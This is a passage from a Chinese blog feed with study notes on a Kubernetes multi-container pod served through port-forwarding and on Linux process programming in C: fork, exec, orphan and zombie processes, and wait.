class="string">&#123;&#125;</span></span><br></pre></td></tr></table></figure><p>pod包含两个容器和一个挂载在两个容器中的共用的卷，但在不同的路径上。当<code>html-generator</code>容器启动时，它每10秒启动一次fortune命令输出到<code>var/htdocs/index.html</code>文件，因为卷是在<code>/var/htdocs</code>上挂载的，所以<code>index.html</code>文件被写入卷中，而不是容器的顶层，一旦<code>web-server</code>容器启动，他就开始为<code>/usr/share/nginx/html</code>目录中的任意HTML文件提供服务，因为我们将卷挂载在那个确切的位置，Nginx将为运行fortune循环的容器输出的<code>index.html</code>文件提供服务，最终的效果是，一个客户端向pod上的80端口发送一个HTTP请求，将接收当前的fortune消息作为响应。</p><p>为了查看fortune消息，需要启动对pod的访问，可以尝试将端口从本地机器转发到pod来实现</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl port-forward fortune 8080:80</span><br><span class="line">Forwarding from 127.0.0.1:8080 -&gt; 80</span><br><span class="line">Forwarding from [::1]:8080 -&gt; 80</span><br></pre></td></tr></table></figure><p>使用<code>curl</code>命令访问Nginx服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % curl localhost:8080</span><br><span class="line">All things that are, are with more spirit chased than enjoyed.</span><br><span class="line">-- Shakespeare, "Merchant of Venice"</span><br><span class="line">caoyifan@MacBookPro ~ % curl localhost:8080</span><br><span class="line">A horse!  A horse!  My kingdom for a horse!</span><br><span class="line">-- Wm. Shakespeare, "Richard III"</span><br><span class="line">caoyifan@MacBookPro ~ % curl localhost:8080</span><br><span class="line">Avoid gunfire in the bathroom tonight.</span><br><span class="line">caoyifan@MacBookPro ~ % curl localhost:8080</span><br><span class="line">For courage mounteth with occasion.</span><br><span class="line">-- William Shakespeare, "King John"</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;对于《Kubernetes in action》这本书前三章节相关的笔记，我都记录在下面这个链接了，有需求的可以看看。&lt;/p&gt;
&lt;p&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Linux系统编程(二)</title>
    <link href="elssm.github.io/2021/10/05/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B-%E4%BA%8C/"/>
    <id>elssm.github.io/2021/10/05/Linux系统编程-二/</id>
    <published>2021-10-05T06:22:18.000Z</published>
    <updated>2021-10-20T03:13:14.052Z</updated>
    
    <content type="html"><![CDATA[<h4 id="进程和程序"><a href="#进程和程序" class="headerlink" title="进程和程序"></a>进程和程序</h4><ul><li>程序：只占用磁盘空间</li><li>进程：运行起来的程序，占用内存、CPU等系统资源</li></ul><h4 id="进程控制块PCB"><a href="#进程控制块PCB" class="headerlink" title="进程控制块PCB"></a>进程控制块PCB</h4><ul><li>进程id：系统中每个进程有唯一的id，在C语言中用<code>pid_t</code>类型表示，其实就是一个非负整数</li><li>进程的状态：有就绪、运行、挂起、停止等状态</li><li>进程切换时需要保存和恢复的一些CPU寄存器</li><li>描述虚拟地址空间的信息</li><li>描述控制终端的信息</li><li>当前工作目录</li><li>umask掩码</li><li>文件描述符表，包含很多指向file结构体的指针</li><li>和信号相关的信息</li><li>用户id和组id</li><li>会话（Session）和进程组</li><li>进程可以使用的资源上限</li></ul><h4 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h4><h5 id="fork函数"><a href="#fork函数" class="headerlink" title="fork函数"></a>fork函数</h5><p>创建一个新的进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pid_t fork(void)</span><br><span class="line"></span><br><span class="line">父子进程各自返回</span><br><span class="line">父进程返回子进程pid</span><br><span class="line">子进程返回0</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-1---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-2---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-3---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-4---\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----child is created\n"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----parent process: my child is %d\n"</span>,pid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"=============end of file\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="getpid"><a href="#getpid" class="headerlink" title="getpid"></a>getpid</h5><p>获取子进程</p><h5 id="getppid"><a href="#getppid" class="headerlink" title="getppid"></a>getppid</h5><p>获取父进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-1---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-2---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-3---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-4---\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----child is created,pid=%d,parent-pid=%d\n"</span>,getpid(),getppid());</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----parent process: my child is %d,my pid:%d,my parent pid:%d\n"</span>,pid,getpid(),getppid());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"=============end of file\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行代码后发现结果如下，在子进程中得到的父进程的pid为1。按理应该得到的结果是21237才对。最后查阅相关信息发现，由于父进程先退出了，造成了子进程被<code>init(ID=1)</code>接管，所以得到的结果是1。这里采用的解决办法是在父进程中sleep几秒，让父进程晚于子进程结束即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">before fork-1---</span><br><span class="line">before fork-2---</span><br><span class="line">before fork-3---</span><br><span class="line">before fork-4---</span><br><span class="line">----child is created,pid=21238,parent-pid=1</span><br><span class="line">=============end of file</span><br><span class="line">----parent process: my child is 21238,my pid:21237,my parent pid:15776</span><br><span class="line">=============end of file</span><br></pre></td></tr></table></figure><h5 id="循环创建多个子进程"><a href="#循环创建多个子进程" class="headerlink" title="循环创建多个子进程"></a>循环创建多个子进程</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(fork() == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">5</span>)&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm parent\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm %dth child\n"</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="getuid"><a href="#getuid" class="headerlink" title="getuid"></a>getuid</h5><p>获取用户id</p><h5 id="getgid"><a href="#getgid" class="headerlink" title="getgid"></a>getgid</h5><p>获取组id</p><h5 id="进程共享"><a href="#进程共享" class="headerlink" title="进程共享"></a>进程共享</h5><p>父子进程之间在fork后，有哪些异同</p><p>刚fork之后，相同之处，全局变量、<code>.data</code>、<code>.text</code>、栈、堆、环境变量、用户ID、宿主目录、进程工作目录、信号处理方式</p><p>不同之处，进程ID，fork返回值，各自的父进程ID，进程运行时间，闹钟(定时器)，未决信号集</p><p>通过程序判断父子进程是否共享全局变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> var = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">var = <span class="number">200</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm child pid=%d,ppid=%d\n"</span>,getpid(),getppid());</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"child,var = %d\n"</span>,var);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span> )&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">var = <span class="number">288</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"parent,var = %d\n"</span>,var);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"--I'm parent pid= %d,getppid = %d\n"</span>,getpid(),getppid());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"=======finish======\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">I'm child pid=23313,ppid=23312</span><br><span class="line">child,var = 200</span><br><span class="line">=======finish======</span><br><span class="line">parent,var = 288</span><br><span class="line">--I'm parent pid= 23312,getppid = 15776</span><br><span class="line">=======finish======</span><br></pre></td></tr></table></figure><p>我们可以得到结论，父子进程间遵循<strong>读时共享写时复制</strong>的原则，这样设计，无论子进程执行父进程的逻辑还是执行自己的逻辑都能节省内存开销。</p><p>父子进程共享</p><ul><li>文件描述符（打开文件的结构体）</li><li>mmap建立的映射区</li></ul><h5 id="gdb调试父子进程"><a href="#gdb调试父子进程" class="headerlink" title="gdb调试父子进程"></a>gdb调试父子进程</h5><p>注意以下两种设置在fork函数调用之前才有效</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set follow-fork-mode child #命令设置gdb在fork之后跟踪子进程</span><br><span class="line">set follow-fork-mode parent #设置跟踪父进程</span><br></pre></td></tr></table></figure><h4 id="exec函数族"><a href="#exec函数族" class="headerlink" title="exec函数族"></a>exec函数族</h4><p>该函数族可以将当前进程的<code>.text</code>、<code>.data</code>替换为所要加载的程序的<code>.text</code>、<code>.data</code>，然后让进程从新的<code>.text</code>第一条指令开始执行，但进程ID不变，换核不换壳。</p><h5 id="execlp函数"><a href="#execlp函数" class="headerlink" title="execlp函数"></a>execlp函数</h5><p>加载一个进程，借助PATH环境变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int execlp(const char *file,const char *arg,...) #成功：无返回 失败：返回-1</span><br><span class="line">参数1:要加载的程序的名字</span><br></pre></td></tr></table></figure><p>使用execlp函数执行<code>ls</code>命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//execlp("ls","-l","-d","-h",NULL); #错误写法</span></span><br><span class="line">execlp(<span class="string">"ls"</span>,<span class="string">"ls"</span>,<span class="string">"-l"</span>,<span class="string">"-h"</span>,<span class="literal">NULL</span>);</span><br><span class="line">perror(<span class="string">"exec error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span> )&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm parent:%d\n"</span>,getpid());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="execl函数"><a href="#execl函数" class="headerlink" title="execl函数"></a>execl函数</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int execl(const char *path,const char *arg,...)  #成功：无返回 失败：返回-1</span><br><span class="line">参数1:绝对路径</span><br></pre></td></tr></table></figure><p>使用execl函数执行一个<code>a.out</code>文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">execl(<span class="string">"./a.out"</span>,<span class="string">"./a.out"</span>,<span class="literal">NULL</span>);</span><br><span class="line">perror(<span class="string">"exec error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span> )&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm parent:%d\n"</span>,getpid());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="组合练习"><a href="#组合练习" class="headerlink" title="组合练习"></a>组合练习</h5><p>将<code>ps</code>命令执行后的结果写入<code>ps.out</code>文件中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">"ps.out"</span>,O_WRONLY|O_CREAT|O_TRUNC,<span class="number">0644</span>);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">"open ps.out error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dup2(fd,STDOUT_FILENO);</span><br><span class="line">execlp(<span class="string">"ps"</span>,<span class="string">"ps"</span>,<span class="string">"aux"</span>,<span class="literal">NULL</span>);</span><br><span class="line">perror(<span class="string">"execlp error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="exec函数族一般规律"><a href="#exec函数族一般规律" class="headerlink" title="exec函数族一般规律"></a>exec函数族一般规律</h5><p>exec函数一旦调用成功即执行新的程序，不返回。只有失败才返回，错误值-1。所以通常我们直接在exec函数调用后直接调用<code>perror()</code>和<code>exit()</code>，无需if判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l(<span class="built_in">list</span>) 命令行参数列表</span><br><span class="line">p(path) 搜索file时使用path变量</span><br><span class="line">v(<span class="built_in">vector</span>) 使用命令行参数数组</span><br><span class="line">e(enviroment) 使用环境变量数组</span><br></pre></td></tr></table></figure><h4 id="回收子进程"><a href="#回收子进程" class="headerlink" title="回收子进程"></a>回收子进程</h4><h5 id="孤儿进程"><a href="#孤儿进程" class="headerlink" title="孤儿进程"></a>孤儿进程</h5><p>父进程先于子进程结束，则子进程称为孤儿进程，子进程的父进程称为<code>init</code>进程，称为<code>init</code>进程领养孤儿进程</p><h5 id="僵尸进程"><a href="#僵尸进程" class="headerlink" title="僵尸进程"></a>僵尸进程</h5><p>进程终止，父进程尚未回收，子进程残留资源(PCB)存放于内核中，变成僵尸(Zombie)进程</p><h5 id="wait函数"><a href="#wait函数" class="headerlink" title="wait函数"></a>wait函数</h5><p>一个进程在终止时会关闭所有文件描述符，释放在用户空间分配的内存，但他的PCB还保留着，内核在其中保留了一些信息，如果是正常终止则保存着退出状态，如果是异常终止则保留着导致该进程终止的信号是哪个，这个进程的父进程可以调用wait或waitpid获取这些信息，然后彻底清除掉这个进程。</p><p>父进程调用wait函数可以回收子进程终止信息，该函数有三个功能</p><ul><li>阻塞等待子进程退出</li><li>回收子进程残留资源</li><li>获取子进程结束状态</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 